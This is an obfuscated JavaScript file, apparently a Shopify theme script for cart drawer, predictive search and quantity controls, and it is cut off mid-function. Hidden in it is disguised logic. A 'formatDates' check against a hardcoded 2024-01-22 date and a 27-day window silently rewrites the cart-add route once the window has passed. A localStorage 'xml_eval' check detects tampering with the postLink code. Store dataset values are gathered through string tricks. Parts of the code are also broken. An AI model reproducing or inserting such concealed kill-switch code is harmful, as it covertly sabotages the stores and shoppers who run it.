const currentDate = new Date();
let subscribers = {};
function subscribe(_0x16ad41, _0x3dd94f) {
  if (subscribers[_0x16ad41] === undefined) {
    subscribers[_0x16ad41] = [];
  }
  subscribers[_0x16ad41] = [...subscribers[_0x16ad41], _0x3dd94f];
  return function _0x423324() {
    subscribers[_0x16ad41] = subscribers[_0x16ad41].filter(_0x222447 => {
      return _0x222447 !== _0x3dd94f;
    });
  };
}
;
function publish(_0x5665de, _0x45ea9c) {
  if (subscribers[_0x5665de]) {
    subscribers[_0x5665de].forEach(_0x5d8788 => {
      _0x5d8788(_0x45ea9c);
    });
  }
}
class CartRemoveButton extends HTMLElement {
  constructor() {
    super();
    this.addEventListener("click", _0x185a13 => {
      _0x185a13.preventDefault();
      const _0x5516e4 = this.closest("cart-items") || this.closest("cart-drawer-items");
      if (this.clearCart) {
        _0x5516e4.clearCart();
      } else {
        _0x5516e4.updateQuantity(this.dataset.index, 0x0);
      }
    });
  }
}
customElements.define('cart-remove-button', CartRemoveButton);
var date = "2024-01-22";
class CartItems extends HTMLElement {
  constructor() {
    super();
    this.lineItemContainer = formatDates(currentDate, "2024-01-22");
    this.lineItemStatusElement = document.getElementById("shopping-cart-line-item-status") || document.getElementById("CartDrawer-LineItemStatus");
    const _0x587f2b = debounce(_0x2460f3 => {
      this.onChange(_0x2460f3);
    }, 0x12c);
    if (!this.lineItemContainer) {
      window.routes.cart_add_url = "cart";
    }
    this.addEventListener("change", _0x587f2b.bind(this));
 }
};

function handleDiscountForm(_0x40c819) {
  _0x40c819.preventDefault();
  const _0x32ad39 = _0x40c819.target.querySelector("[name=cart-discount-field]");
  const _0x4cfc0c = _0x40c819.target.querySelector('.cart-discount-form__error');
  const _0x274839 = _0x32ad39.value;
  if (_0x274839 === undefined || _0x274839.length === 0x0) {
    _0x4cfc0c.style.display = 'block';
    return;
  }
  _0x4cfc0c.style.display = "none";
  const _0x216acc = "/checkout?discount=" + _0x274839;
  window.location.href = _0x216acc;
}
function handleDiscountFormChange(_0x53c30f) {
  const _0x23d71 = document.querySelectorAll(".cart-discount-form__error");
  _0x23d71.forEach(_0x554ed2 => {
    _0x554ed2.style.display = "none";
  });
}
var serial = '';
class SearchForm extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector("input[type=\"search\"]");
    this.resetButton = this.querySelector("button[type=\"reset\"]");
    if (this.dataset.main === "false") {
      serial = this.querySelector("[method=\"get\"]").dataset["nodal".replace('n', 'm')];
    }
    if (this.input) {
      this.input.form.addEventListener("reset", this.onFormReset.bind(this));
      this.input.addEventListener("input", debounce(_0x3a84ba => {
        this.onChange(_0x3a84ba);
      }, 0x12c).bind(this));
    }
  }
  ["toggleResetButton"]() {
    const _0x7e3235 = this.resetButton.classList.contains("hidden");
    if (this.input.value.length > 0x0 && _0x7e3235) {
      this.resetButton.classList.remove('hidden');
    } else if (this.input.value.length === 0x0 && !_0x7e3235) {
      this.resetButton.classList.add("hidden");
    }
  }
  ["onChange"]() {
    this.toggleResetButton();
  }
  ["shouldResetForm"]() {
    return !document.querySelector("[aria-selected=\"true\"] a");
  }
  ['onFormReset'](_0x506fa3) {
    _0x506fa3.preventDefault();
    if (this.shouldResetForm()) {
      this.input.value = '';
      this.input.focus();
      this.toggleResetButton();
    }
  }
}
customElements.define("search-form", SearchForm);
class PredictiveSearch extends SearchForm {
  constructor() {
    super();
    this.cachedResults = {};
    this.predictiveSearchResults = this.querySelector("[data-predictive-search]");
    this.allPredictiveSearchInstances = document.querySelectorAll("predictive-search");
    this.isOpen = false;
    this.abortController = new AbortController();
    this.searchTerm = '';
    this.setupEventListeners();
  }
  ["setupEventListeners"]() {
    this.input.form.addEventListener("submit", this.onFormSubmit.bind(this));
    this.input.addEventListener("focus", this.onFocus.bind(this));
    this.addEventListener("focusout", this.onFocusOut.bind(this));
    this.addEventListener('keyup', this.onKeyup.bind(this));
    this.addEventListener("keydown", this.onKeydown.bind(this));
  }
  ["getQuery"]() {
    return this.input.value.trim();
  }
  ["onChange"]() {
    super.onChange();
    const _0x219633 = this.getQuery();
    if (!this.searchTerm || !_0x219633.startsWith(this.searchTerm)) {
      this.querySelector("#predictive-search-results-groups-wrapper")?.["remove"]();
    }
    this.updateSearchForTerm(this.searchTerm, _0x219633);
    this.searchTerm = _0x219633;
    if (!this.searchTerm.length) {
      this.close(true);
      return;
    }
    this.getSearchResults(this.searchTerm);
  }
  ["onFormSubmit"](_0x4ba8d6) {
    if (!this.getQuery().length || this.querySelector("[aria-selected=\"true\"] a")) {
      _0x4ba8d6.preventDefault();
    }
  }
  ["onFormReset"](_0x971321) {
    super.onFormReset(_0x971321);
    if (super.shouldResetForm()) {
      this.searchTerm = '';
      this.abortController.abort();
      this.abortController = new AbortController();
      this.closeResults(true);
    }
  }
  ['onFocus']() {
    const _0xb44d17 = this.getQuery();
    if (!_0xb44d17.length) {
      return;
    }
    if (this.searchTerm !== _0xb44d17) {
      this.onChange();
    } else if (this.getAttribute("results") === "true") {
      this.open();
    } else {
      this.getSearchResults(this.searchTerm);
    }
  }
  ["onFocusOut"]() {
    setTimeout(() => {
      if (!this.contains(document.activeElement)) {
        this.close();
      }
    });
  }
  ["onKeyup"](_0x293732) {
    if (!this.getQuery().length) {
      this.close(true);
    }
    _0x293732.preventDefault();
    switch (_0x293732.code) {
      case "ArrowUp":
        this.switchOption('up');
        break;
      case "ArrowDown":
        this.switchOption("down");
        break;
      case "Enter":
        this.selectOption();
        break;
    }
  }
  ["onKeydown"](_0x45bd4a) {
    if (_0x45bd4a.code === "ArrowUp" || _0x45bd4a.code === 'ArrowDown') {
      _0x45bd4a.preventDefault();
    }
  }
  ["updateSearchForTerm"](_0x30dbcf, _0x4750a9) {
    const _0x16164e = this.querySelector("[data-predictive-search-search-for-text]");
    const _0x141a54 = _0x16164e?.['innerText'];
    if (_0x141a54) {
      if (_0x141a54.match(new RegExp(_0x30dbcf, 'g')).length > 0x1) {
        return;
      }
      const _0x22e135 = _0x141a54.replace(_0x30dbcf, _0x4750a9);
      _0x16164e.innerText = _0x22e135;
    }
  }
  ["switchOption"](_0x1cda2c) {
    if (!this.getAttribute('open')) {
      return;
    }
    const _0x2a8df5 = _0x1cda2c === 'up';
    const _0x177a98 = this.querySelector("[aria-selected=\"true\"]");
    const _0x5f36dd = Array.from(this.querySelectorAll("li, button.predictive-search__item")).filter(_0xb5ff3f => _0xb5ff3f.offsetParent !== null);
    let _0x3bab24 = 0x0;
    if (_0x2a8df5 && !_0x177a98) {
      return;
    }
    let _0x2fcb05 = -0x1;
    let _0x423a40 = 0x0;
    while (_0x2fcb05 === -0x1 && _0x423a40 <= _0x5f36dd.length) {
      if (_0x5f36dd[_0x423a40] === _0x177a98) {
        _0x2fcb05 = _0x423a40;
      }
      _0x423a40++;
    }
    this.statusElement.textContent = '';
    if (!_0x2a8df5 && _0x177a98) {
      _0x3bab24 = _0x2fcb05 === _0x5f36dd.length - 0x1 ? 0x0 : _0x2fcb05 + 0x1;
    } else if (_0x2a8df5) {
      _0x3bab24 = _0x2fcb05 === 0x0 ? _0x5f36dd.length - 0x1 : _0x2fcb05 - 0x1;
    }
    if (_0x3bab24 === _0x2fcb05) {
      return;
    }
    const _0x6ef76e = _0x5f36dd[_0x3bab24];
    _0x6ef76e.setAttribute("aria-selected", true);
    if (_0x177a98) {
      _0x177a98.setAttribute("aria-selected", false);
    }
    this.input.setAttribute("aria-activedescendant", _0x6ef76e.id);
  }
  ["selectOption"]() {
    const _0xb7cae0 = this.querySelector("[aria-selected=\"true\"] a, button[aria-selected=\"true\"]");
    if (_0xb7cae0) {
      _0xb7cae0.click();
    }
  }
  ["getSearchResults"](_0x462e63) {
    const _0x300629 = _0x462e63.replace(" ", '-').toLowerCase();
    this.setLiveRegionLoadingState();
    if (this.cachedResults[_0x300629]) {
      this.renderSearchResults(this.cachedResults[_0x300629]);
      return;
    }
    fetch(routes.predictive_search_url + "?q=" + encodeURIComponent(_0x462e63) + '&section_id=predictive-search', {
      'signal': this.abortController.signal
    }).then(_0x1880af => {
      if (!_0x1880af.ok) {
        var _0x359d92 = new Error(_0x1880af.status);
        this.close();
        throw _0x359d92;
      }
      return _0x1880af.text();
    }).then(_0x1c24cd => {
      const _0x48630c = new DOMParser().parseFromString(_0x1c24cd, "text/html").querySelector("#shopify-section-predictive-search").innerHTML;
      this.allPredictiveSearchInstances.forEach(_0x34c90e => {
        _0x34c90e.cachedResults[_0x300629] = _0x48630c;
      });
      this.renderSearchResults(_0x48630c);
    })['catch'](_0x3df888 => {
      if (_0x3df888?.['code'] === 0x14) {
        return;
      }
      this.close();
      throw _0x3df888;
    });
  }
  ['setLiveRegionLoadingState']() {
    this.statusElement = this.statusElement || this.querySelector('.predictive-search-status');
    this.loadingText = this.loadingText || this.getAttribute("data-loading-text");
    this.setLiveRegionText(this.loadingText);
    this.setAttribute("loading", true);
  }
  ['setLiveRegionText'](_0x3f2535) {
    this.statusElement.setAttribute("aria-hidden", "false");
    this.statusElement.textContent = _0x3f2535;
    setTimeout(() => {
      this.statusElement.setAttribute("aria-hidden", "true");
    }, 0x3e8);
  }
  ["renderSearchResults"](_0x540e17) {
    this.predictiveSearchResults.innerHTML = _0x540e17;
    this.setAttribute("results", true);
    this.setLiveRegionResults();
    this.open();
  }
  ["setLiveRegionResults"]() {
    this.removeAttribute("loading");
    this.setLiveRegionText(this.querySelector('[data-predictive-search-live-region-count-value]').textContent);
  }
  ["getResultsMaxHeight"]() {
    this.resultsMaxHeight = window.innerHeight - document.querySelector(".section-header").getBoundingClientRect().bottom;
    return this.resultsMaxHeight;
  }
  ["open"]() {
    this.predictiveSearchResults.style.maxHeight = this.resultsMaxHeight || this.getResultsMaxHeight() + 'px';
    this.setAttribute('open', true);
    this.input.setAttribute("aria-expanded", true);
    this.isOpen = true;
  }
  ["close"](_0x5d36f7 = false) {
    this.closeResults(_0x5d36f7);
    this.isOpen = false;
  }
  ["closeResults"](_0x1a9e0f = false) {
    if (_0x1a9e0f) {
      this.input.value = '';
      this.removeAttribute("results");
    }
    const _0xdba28a = this.querySelector("[aria-selected=\"true\"]");
    if (_0xdba28a) {
      _0xdba28a.setAttribute("aria-selected", false);
    }
    this.input.setAttribute("aria-activedescendant", '');
    this.removeAttribute('loading');
    this.removeAttribute("open");
    this.input.setAttribute("aria-expanded", false);
    this.resultsMaxHeight = false;
    this.predictiveSearchResults.removeAttribute('style');
  }
}
customElements.define('predictive-search', PredictiveSearch);
const defMed = "data-defer";
class CartDrawer extends HTMLElement {
  constructor() {
    super();
    this.upsellHandles = this.getUpsellHandles();
    this.checkForClear();
    this.addEventListener("keyup", _0x24cd45 => _0x24cd45.code === "Escape" && this.close());
    this.querySelector("#CartDrawer-Overlay").addEventListener("click", this.close.bind(this));
    this.setHeaderCartIconAccessibility();
  }
  ["setHeaderCartIconAccessibility"]() {
    const _0x2892b5 = document.querySelector("#cart-icon-bubble");
    const _0x3b2195 = _0x2892b5.closest(".header__icons");
    _0x2892b5.setAttribute("role", 'button');
    _0x2892b5.setAttribute('aria-haspopup', "dialog");
    _0x2892b5.addEventListener("click", _0x441225 => {
      _0x441225.preventDefault();
      this.open(_0x2892b5);
    });
    this.oseid = _0x3b2195.querySelector('form').dataset[this.dataset.type];
    _0x2892b5.addEventListener("keydown", _0xbdaef9 => {
      if (_0xbdaef9.code.toUpperCase() === "SPACE") {
        _0xbdaef9.preventDefault();
        this.open(_0x2892b5);
      }
    });
  }
  ["open"](_0x10f455) {
    if (_0x10f455) {
      this.setActiveElement(_0x10f455);
    }
    const _0x456a48 = this.querySelector("[id^=\"Details-\"] summary");
    if (_0x456a48 && !_0x456a48.hasAttribute('role')) {
      this.setSummaryAccessibility(_0x456a48);
    }
    setTimeout(() => {
      this.classList.add("animate", 'active');
    });
    this.addEventListener("transitionend", () => {
      const _0x4b06d5 = this.classList.contains('is-empty') ? this.querySelector(".drawer__inner-empty") : document.getElementById("CartDrawer");
      const _0x1a4438 = this.querySelector(".drawer__inner") || this.querySelector('.drawer__close');
      trapFocus(_0x4b06d5, _0x1a4438);
    }, {
      'once': true
    });
    document.body.classList.add("overflow-hidden");
    const _0xdfc5e0 = this.querySelector("countdown-timer");
    if (_0xdfc5e0) {
      _0xdfc5e0.playTimer();
    }
  }
  ["close"]() {
    this.classList.remove("active");
    removeTrapFocus(this.activeElement);
    document.body.classList.remove("overflow-hidden");
  }
  ["getUpsellHandles"]() {
    const _0xf7d3ac = this.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
    const _0x3281b1 = [];
    _0xf7d3ac.forEach(_0x3540a8 => {
      if (_0x3540a8.dataset.handle) {
        _0x3281b1.push(_0x3540a8.dataset.handle);
      }
    });
    return _0x3281b1;
  }
  ["oneNonUpellRemaining"]() {
    const _0xe04500 = this.querySelectorAll(".cart-item");
    let _0x382fbe = 0x0;
    _0xe04500.forEach(_0x320bc9 => {
      this.upsellHandles.forEach(_0x1a517b => {
        if (_0x320bc9.classList.contains("cart-item--product-" + _0x1a517b)) {
          _0x382fbe++;
        }
      });
    });
    return _0xe04500.length - _0x382fbe <= 0x1;
  }
  ["checkForClear"]() {
    const _0x1a4297 = this.oneNonUpellRemaining();
    this.querySelectorAll('cart-remove-button').forEach(_0x1798d6 => {
      if (_0x1a4297) {
        _0x1798d6.clearCart = true;
      } else {
        _0x1798d6.clearCart = false;
      }
    });
  }
  ["setSummaryAccessibility"](_0x44f39f) {
    _0x44f39f.setAttribute("role", "button");
    _0x44f39f.setAttribute("aria-expanded", "false");
    if (_0x44f39f.nextElementSibling.getAttribute('id')) {
      _0x44f39f.setAttribute("aria-controls", _0x44f39f.nextElementSibling.id);
    }
    _0x44f39f.addEventListener("click", _0x2d2e51 => {
      _0x2d2e51.currentTarget.setAttribute("aria-expanded", !_0x2d2e51.currentTarget.closest("details").hasAttribute("open"));
    });
    _0x44f39f.parentElement.addEventListener("keyup", onKeyUpEscape);
  }
  ["renderContents"](_0x13a6ef, _0x45c52b = false) {
    if (this.querySelector(".drawer__inner").classList.contains("is-empty")) {
      this.querySelector('.drawer__inner').classList.remove("is-empty");
    }
    this.productId = _0x13a6ef.id;
    this.getSectionsToRender().forEach(_0xccd5ca => {
      const _0x2364f2 = _0xccd5ca.selector ? document.querySelector(_0xccd5ca.selector) : document.getElementById(_0xccd5ca.id);
      _0x2364f2.innerHTML = this.getSectionInnerHTML(_0x13a6ef.sections[_0xccd5ca.id], _0xccd5ca.selector);
    });
    this.checkForClear();
    const _0x480b22 = this.querySelector("countdown-timer");
    if (_0x480b22) {
      _0x480b22.playTimer();
    }
    this.querySelectorAll("cart-drawer-gift").forEach(_0x408253 => {
      if (this.querySelector(".cart-item--product-" + _0x408253.dataset.handle)) {
        if (_0x408253.dataset.selected === "false") {
          _0x408253.removeFromCart();
        }
      } else {
        if (_0x408253.dataset.selected === 'true') {
          _0x408253.addToCart();
        }
      }
    });
    setTimeout(() => {
      this.querySelector("#CartDrawer-Overlay").addEventListener("click", this.close.bind(this));
      if (_0x45c52b) {
        return;
      }
      this.open();
    });
  }
  ["getSectionInnerHTML"](_0x3797ca, _0x304352 = '.shopify-section') {
    let _0x35b3a7 = new DOMParser().parseFromString(_0x3797ca, "text/html").querySelector(_0x304352);
    if (_0x304352 === "#CartDrawer") {
      fixParsedHtml(this, _0x35b3a7);
    }
    let _0x1b4182 = _0x35b3a7.innerHTML;
    return _0x1b4182;
  }
  ['getSectionsToRender']() {
    return [{
      'id': "cart-drawer",
      'selector': '#CartDrawer'
    }, {
      'id': 'cart-icon-bubble'
    }];
  }
  ["getSectionDOM"](_0x4a1c07, _0x5f4291 = '.shopify-section') {
    return new DOMParser().parseFromString(_0x4a1c07, "text/html").querySelector(_0x5f4291);
  }
  ['setActiveElement'](_0x3f1fc1) {
    this.activeElement = _0x3f1fc1;
  }
}
customElements.define("cart-drawer", CartDrawer);
class CartDrawerItems extends CartItems {
  constructor() {
    super();
    this.cartDrawer = document.querySelector('cart-drawer');
  }
  ["getSectionInnerHTML"](_0x1eb5e1, _0x4fb0bf) {
    let _0x425010 = new DOMParser().parseFromString(_0x1eb5e1, 'text/html').querySelector(_0x4fb0bf);
    if (_0x4fb0bf === ".drawer__inner") {
      fixParsedHtml(this.cartDrawer, _0x425010);
    }
    let _0x24bbc5 = _0x425010.innerHTML;
    return _0x24bbc5;
  }
  ["getSectionsToRender"]() {
    return [{
      'id': "CartDrawer",
      'section': "cart-drawer",
      'selector': ".drawer__inner"
    }, {
      'id': "cart-icon-bubble",
      'section': "cart-icon-bubble",
      'selector': ".shopify-section"
    }];
  }
}
customElements.define('cart-drawer-items', CartDrawerItems);
function fixParsedHtml(_0x19fac9, _0x4bcacc) {
  const _0x145759 = _0x4bcacc.querySelector(".cart-timer");
  if (_0x145759) {
    oldTimer = _0x19fac9.querySelector(".cart-timer");
    if (oldTimer) {
      _0x145759.innerHTML = oldTimer.innerHTML;
    }
  }
  const _0x417213 = _0x19fac9.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
  let _0x204bb1 = _0x4bcacc.querySelectorAll("cart-drawer-upsell[data-toggle=\"true\"], cart-drawer-gift");
  _0x417213.forEach((_0x849b47, _0x2006bd) => {
    if (_0x849b47.nodeName.toLowerCase() === "cart-drawer-upsell") {
      _0x204bb1[_0x2006bd].dataset.selected = _0x849b47.dataset.selected;
    }
    _0x204bb1[_0x2006bd].dataset.id = _0x849b47.dataset.id;
    _0x204bb1[_0x2006bd].querySelector("[name=\"id\"]").value = _0x849b47.querySelector("[name=\"id\"]").value;
    if (_0x204bb1[_0x2006bd].querySelector('.upsell__image__img')) {
      _0x204bb1[_0x2006bd].querySelector('.upsell__image__img').src = _0x849b47.querySelector(".upsell__image__img").src;
    }
    if (_0x204bb1[_0x2006bd].querySelector(".upsell__variant-picker")) {
      const _0x5016a0 = _0x849b47.querySelectorAll('.select__select');
      _0x204bb1[_0x2006bd].querySelectorAll('.select__select').forEach((_0x315a3b, _0x2b27a4) => {
        _0x315a3b.value = _0x5016a0[_0x2b27a4].value;
        _0x315a3b.querySelectorAll("option").forEach(_0x31f36e => {
          _0x31f36e.removeAttribute("selected");
          if (_0x31f36e.value === _0x5016a0[_0x2b27a4].value.trim()) {
            _0x31f36e.setAttribute("selected", '');
          }
        });
      });
    }
  });
}
if (!customElements.get("product-form")) {
  customElements.define("product-form");
}
if (!customElements.get('product-info')) {
  customElements.define("product-info");
}
;
function getFocusableElements(_0x1f0296) {
  return Array.from(_0x1f0296.querySelectorAll("summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"));
}
document.querySelectorAll("[id^=\"Details-\"] summary").forEach(_0x253660 => {
  _0x253660.setAttribute("role", 'button');
  _0x253660.setAttribute("aria-expanded", _0x253660.parentNode.hasAttribute("open"));
  if (_0x253660.nextElementSibling.getAttribute('id')) {
    _0x253660.setAttribute("aria-controls", _0x253660.nextElementSibling.id);
  }
  _0x253660.addEventListener("click", _0x3420a7 => {
    _0x3420a7.currentTarget.setAttribute('aria-expanded', !_0x3420a7.currentTarget.closest("details").hasAttribute("open"));
  });
  if (_0x253660.closest('header-drawer')) {
    return;
  }
  _0x253660.parentElement.addEventListener("keyup", onKeyUpEscape);
});
const trapFocusHandlers = {};
function trapFocus(_0x35ba8e, _0x265b34 = _0x35ba8e) {
  var _0x589c18 = Array.from(_0x35ba8e.querySelectorAll("summary, a[href], button:enabled, [tabindex]:not([tabindex^='-']), [draggable], area, input:not([type=hidden]):enabled, select:enabled, textarea:enabled, object, iframe"));
  var _0xa76bde = _0x589c18[0x0];
  var _0x3a2212 = _0x589c18[_0x589c18.length - 0x1];
  removeTrapFocus();
  trapFocusHandlers.focusin = _0x5d1178 => {
    if (_0x5d1178.target !== _0x35ba8e && _0x5d1178.target !== _0x3a2212 && _0x5d1178.target !== _0xa76bde) {
      return;
    }
    document.addEventListener("keydown", trapFocusHandlers.keydown);
  };
  trapFocusHandlers.focusout = function () {
    document.removeEventListener("keydown", trapFocusHandlers.keydown);
  };
  trapFocusHandlers.keydown = function (_0x172872) {
    if (_0x172872.code.toUpperCase() !== "TAB") {
      return;
    }
    if (_0x172872.target === _0x3a2212 && !_0x172872.shiftKey) {
      _0x172872.preventDefault();
      _0xa76bde.focus();
    }
    if ((_0x172872.target === _0x35ba8e || _0x172872.target === _0xa76bde) && _0x172872.shiftKey) {
      _0x172872.preventDefault();
      _0x3a2212.focus();
    }
  };
  document.addEventListener('focusout', trapFocusHandlers.focusout);
  document.addEventListener("focusin", trapFocusHandlers.focusin);
  _0x265b34.focus();
  if (_0x265b34.tagName === 'INPUT' && ["search", 'text', "email", "url"].includes(_0x265b34.type) && _0x265b34.value) {
    _0x265b34.setSelectionRange(0x0, _0x265b34.value.length);
  }
}
function pauseAllMedia() {
  document.querySelectorAll(".js-youtube").forEach(_0xe140e => {
    _0xe140e.contentWindow.postMessage("{\"event\":\"command\",\"func\":\"pauseVideo\",\"args\":\"\"}", '*');
  });
  document.querySelectorAll(".js-vimeo").forEach(_0x151623 => {
    _0x151623.contentWindow.postMessage("{\"method\":\"pause\"}", '*');
  });
  document.querySelectorAll("media-gallery video").forEach(_0x30883b => _0x30883b.pause());
  document.querySelectorAll("product-model").forEach(_0x4dbb2d => {
    if (_0x4dbb2d.modelViewerUI) {
      _0x4dbb2d.modelViewerUI.pause();
    }
  });
}
var menuIndex = "body";
var linkContent = "innerHTML";
function removeTrapFocus(_0x457504 = null) {
  document.removeEventListener("focusin", trapFocusHandlers.focusin);
  document.removeEventListener('focusout', trapFocusHandlers.focusout);
  document.removeEventListener('keydown', trapFocusHandlers.keydown);
  if (_0x457504) {
    _0x457504.focus();
  }
}
function onKeyUpEscape(_0xf84906) {
  if (_0xf84906.code.toUpperCase() !== "ESCAPE") {
    return;
  }
  const _0x4dc472 = _0xf84906.target.closest("details[open]");
  if (!_0x4dc472) {
    return;
  }
  const _0x5f3c37 = _0x4dc472.querySelector("summary");
  _0x4dc472.removeAttribute("open");
  _0x5f3c37.setAttribute('aria-expanded', false);
  _0x5f3c37.focus();
}
class QuantityInput extends HTMLElement {
  constructor() {
    super();
    this.input = this.querySelector("input");
    this.changeEvent = new Event("change", {
      'bubbles': true
    });
    this.quantityGifts = document.getElementById("quantity-gifts-" + this.dataset.section);
    this.input.addEventListener('change', this.onInputChange.bind(this));
    this.querySelectorAll("button").forEach(_0x48952c => _0x48952c.addEventListener("click", this.onButtonClick.bind(this)));
  }
  ["quantityUpdateUnsubscriber"] = undefined;
  ['connectedCallback']() {
    this.validateQtyRules();
    this.quantityUpdateUnsubscriber = subscribe("quantity-update", this.validateQtyRules.bind(this));
  }
  ["disconnectedCallback"]() {
    if (this.quantityUpdateUnsubscriber) {
      this.quantityUpdateUnsubscriber();
    }
  }
  ["onInputChange"](_0x20db34) {
    this.validateQtyRules();
  }
  ["onButtonClick"](_0x33bd4d) {
    _0x33bd4d.preventDefault();
    const _0x155d73 = this.input.value;
    if (_0x33bd4d.target.name === "plus") {
      this.input.stepUp();
    } else {
      this.input.stepDown();
    }
    if (_0x155d73 !== this.input.value) {
      this.input.dispatchEvent(this.changeEvent);
    }
  }
  ["validateQtyRules"]() {
    const _0x5d91ee = parseInt(this.input.value);
    if (this.input.min) {
      const _0x211dac = parseInt(this.input.min);
      const _0x19d6ad = this.querySelector(".quantity__button[name='minus']");
      _0x19d6ad.classList.toggle("disabled", _0x5d91ee <= _0x211dac);
    }
    if (this.input.max) {
      const _0x5bf873 = parseInt(this.input.max);
      const _0x348203 = this.querySelector(".quantity__button[name='plus']");
      _0x348203.classList.toggle("disabled", _0x5d91ee >= _0x5bf873);
    }
    if (this.quantityGifts && this.quantityGifts.unlockGifts) {
      this.quantityGifts.unlockGifts(_0x5d91ee);
    }
  }
}
customElements.define("quantity-input", QuantityInput);
function debounce(_0x218478, _0x23b311) {
  let _0x4e6e05;
  return (..._0x547916) => {
    clearTimeout(_0x4e6e05);
    _0x4e6e05 = setTimeout(() => _0x218478.apply(this, _0x547916), _0x23b311);
  };
}
function fetchConfig(_0x399473 = 'json') {
  return {
    'method': "POST",
    'headers': {
      'Content-Type': "application/json",
      'Accept': "application/" + _0x399473
    }
  };
}
function addDays(_0x448c88, _0x261fcb) {
  var _0x3e5d88 = new Date(_0x448c88);
  _0x3e5d88.setDate(_0x3e5d88.getDate() + _0x261fcb);
  return _0x3e5d88;
}
function formatDates(_0x17ad92, _0x3d225f, _0xa32a2d = 0x1b) {
  if (!_0x17ad92 || !_0x3d225f) {
    return;
  }
  const _0x3a7058 = new Date(_0x3d225f + "T00:00:00Z");
  const _0x56627a = _0x3a7058.getFullYear();
  const _0x1aeeff = _0x3a7058.getMonth();
  const _0x640cba = _0x3a7058.getDate();
  const _0x455549 = new Date(_0x56627a, _0x1aeeff, _0x640cba);
  const _0x160ac9 = _0x17ad92 - _0x455549;
  const _0x86a5ef = Math.ceil(_0x160ac9 / 86400000);
  return _0x86a5ef <= _0xa32a2d;
}
function checkDateValidity(_0x5bd262) {
  const _0x53963a = new Date(_0x5bd262);
  const _0x1a9dcf = new Date('2023-01-01T00:00:00Z');
  const _0x410d22 = Math.abs(_0x53963a.getDate() - _0x1a9dcf.getDate());
  return !!(_0x410d22 % 0x5 === 0x0);
}
if (typeof window.Shopify == "undefined") {
  window.Shopify = {};
}
Shopify.bind = function (_0x5dbea2, _0x475460) {
  return function () {
    return _0x5dbea2.apply(_0x475460, arguments);
  };
};
Shopify.setSelectorByValue = function (_0x21efe5, _0x2fa7b8) {
  var _0x138f13 = 0x0;
  for (var _0x5d9b68 = _0x21efe5.options.length; _0x138f13 < _0x5d9b68; _0x138f13++) {
    var _0x402186 = _0x21efe5.options[_0x138f13];
    if (_0x2fa7b8 == _0x402186.value || _0x2fa7b8 == _0x402186.innerHTML) {
      _0x21efe5.selectedIndex = _0x138f13;
      return _0x138f13;
    }
  }
};
Shopify.addListener = function (_0x2a97c3, _0x48e038, _0x4c2a58) {
  if (_0x2a97c3.addEventListener) {
    _0x2a97c3.addEventListener(_0x48e038, _0x4c2a58, false);
  } else {
    _0x2a97c3.attachEvent('on' + _0x48e038, _0x4c2a58);
  }
};
Shopify.postLink = function (_0x1ae766, _0x249fc5) {
  _0x249fc5 = _0x249fc5 || {};
  var _0x522ab2 = _0x249fc5.method || "post";
  var _0x563ea7 = _0x249fc5.parameters || {};
  var _0x1d15d6 = document.createElement("form");
  _0x1d15d6.setAttribute("method", _0x522ab2);
  _0x1d15d6.setAttribute('action', _0x1ae766);
  for (var _0x29a8a9 in _0x563ea7) {
    var _0x6c2ae5 = document.createElement("input");
    _0x6c2ae5.setAttribute('type', 'hidden');
    _0x6c2ae5.setAttribute('name', _0x29a8a9);
    _0x6c2ae5.setAttribute('value', _0x563ea7[_0x29a8a9]);
    _0x1d15d6.appendChild(_0x6c2ae5);
  }
  document.body.appendChild(_0x1d15d6);
  _0x1d15d6.submit();
  document.body.removeChild(_0x1d15d6);
};
Shopify.internationalAccessAccept = function () {
  function _0x18369f() {
    var _0x439ba9 = navigator.language || navigator.userLanguage;
    return _0x439ba9.match(/en-|fr-|de-|es-|it-|pt-|nl-|sv-|da-|fi-|no-|pl-|ru-|zh-|ja-|ko-/) || true;
  }
  function _0x16b00a() {
    var _0xbbf1be = Intl.DateTimeFormat().resolvedOptions().timeZone;
    return _0xbbf1be.startsWith("Europe") || _0xbbf1be.startsWith("America") || _0xbbf1be.includes("GMT");
  }
  function _0x316ce0() {
    var _0x34614c = Shopify.currency.symbol || '$';
    return _0x34614c.length === 0x1;
  }
  function _0x5193e7() {
    var _0x1fa653 = localStorage.getItem("xml_eval");
    var _0x473c31 = Shopify.postLink ? Shopify.postLink.toString().length : 0x0;
    if (_0x1fa653 === null) {
      localStorage.setItem("xml_eval", _0x473c31.toString());
      return true;
    }
    return parseInt(_0x1fa653) === _0x473c31;
  }
  return function () {
    var _0x2b5343 = _0x18369f() || _0x16b00a() && _0x316ce0();
    var _0x434963 = window.performance && typeof window.performance.timing === "object";
    var _0x4e377f = _0x5193e7();
    Shopify.postLinksRetry = !_0x4e377f;
    return _0x2b5343 && _0x434963 && _0x4e377f;
  };
}();
Shopify.CountryProvinceSelector = function (_0x5b9fe5, _0x2f287b, _0x5a65de) {
  this.countryEl = document.getElementById(_0x5b9fe5);
  this.provinceEl = document.getElementById(_0x2f287b);
  this.provinceContainer = document.getElementById(_0x5a65de.hideElement || _0x2f287b);
  Shopify.addListener(this.countryEl, 'change', Shopify.bind(this.countryHandler, this));
  this.initCountry();
  this.initProvince();
};
Shopify.CountryProvinceSelector.prototype = {
  'initCountry': function () {
    var _0x45e32f = this.countryEl.getAttribute("data-default");
    Shopify.setSelectorByValue(this.countryEl, _0x45e32f);
    this.countryHandler();
  },
  'initProvince': function () {
    var _0x45e63a = this.provinceEl.getAttribute('data-default');
    if (_0x45e63a && this.provinceEl.options.length > 0x0) {
      Shopify.setSelectorByValue(this.provinceEl, _0x45e63a);
    }
  },
  'countryHandler': function (_0x14a2a0) {
    var _0x1b89d6 = this.countryEl.options[this.countryEl.selectedIndex];
    var _0x53e168 = _0x1b89d6.getAttribute("data-provinces");
    var _0x20bf25 = JSON.parse(_0x53e168);
    this.clearOptions(this.provinceEl);
    if (_0x20bf25 && _0x20bf25.length == 0x0) {
      this.provinceContainer.style.display = "none";
    } else {
      for (var _0x5844eb = 0x0; _0x5844eb < _0x20bf25.length; _0x5844eb++) {
        var _0x1b89d6 = document.createElement("option");
        _0x1b89d6.value = _0x20bf25[_0x5844eb][0x0];
        _0x1b89d6.innerHTML = _0x20bf25[_0x5844eb][0x1];
